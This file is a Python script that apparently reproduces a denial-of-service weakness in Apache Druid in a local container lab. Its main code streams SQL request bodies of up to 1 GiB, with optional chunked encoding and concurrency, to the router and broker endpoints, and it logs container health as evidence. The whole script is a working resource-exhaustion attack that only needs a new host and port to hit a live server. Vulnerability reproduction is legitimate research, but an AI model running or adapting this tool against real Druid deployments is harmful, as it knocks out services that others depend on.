#!/usr/bin/env python3
import argparse
import concurrent.futures
import http.client
import json
import subprocess
import time
from pathlib import Path


CASE_DIR = Path(__file__).resolve().parent
LOG_DIR = CASE_DIR / "logs"
EVIDENCE_DIR = CASE_DIR / "evidence"

TARGETS = [
    {"name": "router", "host": "127.0.0.1", "port": 19088, "container": "druiddos_apache_druid_router"},
    {"name": "broker", "host": "127.0.0.1", "port": 19082, "container": "druiddos_apache_druid_broker"},
]

CONTENT_TYPES = ["text/plain", "application/x-www-form-urlencoded"]
DEFAULT_SIZE_STEPS = [
    1024,
    1024 * 1024,
    8 * 1024 * 1024,
    32 * 1024 * 1024,
    64 * 1024 * 1024,
    128 * 1024 * 1024,
    256 * 1024 * 1024,
    512 * 1024 * 1024,
    768 * 1024 * 1024,
    1024 * 1024 * 1024,
]


def run_cmd(args, timeout=20):
    try:
        completed = subprocess.run(args, text=True, capture_output=True, timeout=timeout, check=False)
        return {
            "args": args,
            "returncode": completed.returncode,
            "stdout": completed.stdout.strip(),
            "stderr": completed.stderr.strip(),
        }
    except Exception as exc:
        return {"args": args, "error": repr(exc)}


def docker_stats(containers):
    rows = []
    for container in containers:
        rows.append(run_cmd([
            "docker",
            "stats",
            "--no-stream",
            "--format",
            "{{json .}}",
            container,
        ], timeout=12))
    return rows


def docker_state(containers):
    return run_cmd([
        "docker",
        "inspect",
        "--format",
        "{{json .State}}",
        *containers,
    ], timeout=12)


def availability(target, timeout=10):
    started = time.time()
    try:
        conn = http.client.HTTPConnection(target["host"], target["port"], timeout=timeout)
        conn.request("GET", "/status/health")
        resp = conn.getresponse()
        body = resp.read(1024)
        conn.close()
        return {"status": resp.status, "elapsed_ms": int((time.time() - started) * 1000), "body_prefix": body[:120].decode("utf-8", "replace")}
    except Exception as exc:
        return {"error": repr(exc), "elapsed_ms": int((time.time() - started) * 1000)}


def make_body(size, content_type):
    if content_type == "application/x-www-form-urlencoded":
        prefix = b"SELECT%201%20%2F%2A"
        suffix = b"%2A%2F%20BROKEN"
        fill_byte = b"A"
    else:
        prefix = b"SELECT 1 /*"
        suffix = b"*/ BROKEN"
        fill_byte = b"A"
    fill_len = max(0, size - len(prefix) - len(suffix))
    return prefix + (fill_byte * fill_len) + suffix


def body_parts(size, content_type):
    if content_type == "application/x-www-form-urlencoded":
        prefix = b"SELECT%201%20%2F%2A"
        suffix = b"%2A%2F%20BROKEN"
        fill_byte = b"A"
    else:
        prefix = b"SELECT 1 /*"
        suffix = b"*/ BROKEN"
        fill_byte = b"A"
    fill_len = max(0, size - len(prefix) - len(suffix))
    return prefix, fill_byte, fill_len, suffix


def send_chunked(conn, data):
    if not data:
        return
    conn.send(("%x\r\n" % len(data)).encode("ascii"))
    conn.send(data)
    conn.send(b"\r\n")


def send_streamed_body(conn, size, content_type, chunk_size, chunked=False):
    prefix, fill_byte, fill_len, suffix = body_parts(size, content_type)
    chunk_size = max(1, chunk_size)
    if chunked:
        send_chunked(conn, prefix)
    else:
        conn.send(prefix)
    remaining = fill_len
    fill_chunk = fill_byte * chunk_size
    while remaining > 0:
        part = fill_chunk if remaining >= len(fill_chunk) else fill_byte * remaining
        if chunked:
            send_chunked(conn, part)
        else:
            conn.send(part)
        remaining -= len(part)
    if chunked:
        send_chunked(conn, suffix)
        conn.send(b"0\r\n\r\n")
    else:
        conn.send(suffix)


def post_sql(target, content_type, size, timeout, chunk_size, chunked):
    started = time.time()
    result = {
        "target": target["name"],
        "url": f"http://{target['host']}:{target['port']}/druid/v2/sql/",
        "content_type": content_type,
        "body_size": size,
        "transfer": "chunked" if chunked else "content-length-streamed",
    }
    try:
        conn = http.client.HTTPConnection(target["host"], target["port"], timeout=timeout)
        conn.putrequest("POST", "/druid/v2/sql/")
        conn.putheader("Content-Type", content_type)
        conn.putheader("Accept", "application/json")
        conn.putheader("Connection", "close")
        if chunked:
            conn.putheader("Transfer-Encoding", "chunked")
        else:
            conn.putheader("Content-Length", str(size))
        conn.endheaders()
        send_streamed_body(conn, size, content_type, chunk_size, chunked=chunked)
        resp = conn.getresponse()
        data = resp.read(4096)
        conn.close()
        result.update({
            "status": resp.status,
            "reason": resp.reason,
            "elapsed_ms": int((time.time() - started) * 1000),
            "response_prefix": data[:300].decode("utf-8", "replace"),
        })
    except Exception as exc:
        result.update({
            "error": repr(exc),
            "elapsed_ms": int((time.time() - started) * 1000),
        })
    return result


def parse_csv_ints(value):
    if not value:
        return []
    return [int(item.strip()) for item in value.split(",") if item.strip()]


def selected_size_steps(max_size, explicit_steps):
    if explicit_steps:
        steps = explicit_steps
    else:
        steps = DEFAULT_SIZE_STEPS
    return [size for size in steps if size <= max_size]


def selected_content_types(value):
    if not value:
        return CONTENT_TYPES
    return [item.strip() for item in value.split(",") if item.strip()]


def write_jsonl(path, records):
    with path.open("a", encoding="utf-8") as handle:
        for record in records:
            handle.write(json.dumps(record, sort_keys=True) + "\n")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--max-size", type=int, default=128 * 1024 * 1024)
    parser.add_argument("--size-steps", default="", help="comma-separated byte sizes; defaults include 256/512/768/1024MiB")
    parser.add_argument("--content-types", default=",".join(CONTENT_TYPES))
    parser.add_argument("--concurrency", type=int, default=1)
    parser.add_argument("--include-broker", action="store_true")
    parser.add_argument("--timeout", type=int, default=180)
    parser.add_argument("--chunk-size", type=int, default=1024 * 1024)
    parser.add_argument("--chunked", action="store_true", help="use Transfer-Encoding: chunked instead of Content-Length")
    parser.add_argument("--stop-on-failure", action="store_true")
    args = parser.parse_args()

    LOG_DIR.mkdir(exist_ok=True)
    EVIDENCE_DIR.mkdir(exist_ok=True)
    records_path = EVIDENCE_DIR / "probe_results.jsonl"
    summary_path = EVIDENCE_DIR / "probe_summary.json"
    containers = [target["container"] for target in TARGETS]
    selected_targets = TARGETS if args.include_broker else [TARGETS[0]]
    size_steps = selected_size_steps(args.max_size, parse_csv_ints(args.size_steps))
    content_types = selected_content_types(args.content_types)

    all_records = []
    started_at = time.time()
    request_count = 0

    initial = {
        "phase": "initial",
        "timestamp": time.time(),
        "availability": {target["name"]: availability(target) for target in selected_targets},
        "docker_stats": docker_stats(containers),
        "docker_state": docker_state(containers),
    }
    write_jsonl(records_path, [initial])
    all_records.append(initial)

    for target in selected_targets:
        for content_type in content_types:
            for size in size_steps:
                if size > args.max_size:
                    continue
                before = {
                    "phase": "before_request",
                    "timestamp": time.time(),
                    "target": target["name"],
                    "content_type": content_type,
                    "body_size": size,
                    "availability": {target["name"]: availability(target)},
                    "docker_stats": docker_stats(containers),
                    "docker_state": docker_state(containers),
                }
                write_jsonl(records_path, [before])
                all_records.append(before)

                if args.concurrency <= 1:
                    responses = [post_sql(target, content_type, size, args.timeout, args.chunk_size, args.chunked)]
                else:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as executor:
                        futures = [
                            executor.submit(
                                post_sql,
                                target,
                                content_type,
                                size,
                                args.timeout,
                                args.chunk_size,
                                args.chunked,
                            )
                            for _ in range(args.concurrency)
                        ]
                        responses = [future.result() for future in concurrent.futures.as_completed(futures)]

                request_count += len(responses)
                after = {
                    "phase": "after_request",
                    "timestamp": time.time(),
                    "target": target["name"],
                    "content_type": content_type,
                    "body_size": size,
                    "concurrency": args.concurrency,
                    "responses": responses,
                    "availability": {target["name"]: availability(target)},
                    "docker_stats": docker_stats(containers),
                    "docker_state": docker_state(containers),
                }
                write_jsonl(records_path, [after])
                all_records.append(after)

                bad_availability = any(
                    isinstance(v, dict) and (v.get("error") or int(v.get("status", 0)) >= 500)
                    for v in after["availability"].values()
                )
                hard_errors = any("error" in response for response in responses)
                if args.stop_on_failure and (bad_availability or hard_errors):
                    summary = {
                        "duration_seconds": int(time.time() - started_at),
                        "request_count": request_count,
                        "stopped_early": True,
                        "stop_reason": "availability_or_request_error",
                    }
                    summary_path.write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")
                    return 2

    final = {
        "phase": "final",
        "timestamp": time.time(),
        "availability": {target["name"]: availability(target) for target in selected_targets},
        "docker_stats": docker_stats(containers),
        "docker_state": docker_state(containers),
    }
    write_jsonl(records_path, [final])
    all_records.append(final)
    summary = {
        "duration_seconds": int(time.time() - started_at),
        "request_count": request_count,
        "stopped_early": False,
        "max_size": args.max_size,
        "size_steps": size_steps,
        "concurrency": args.concurrency,
        "targets": [target["name"] for target in selected_targets],
        "content_types": content_types,
        "transfer": "chunked" if args.chunked else "content-length-streamed",
    }
    summary_path.write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
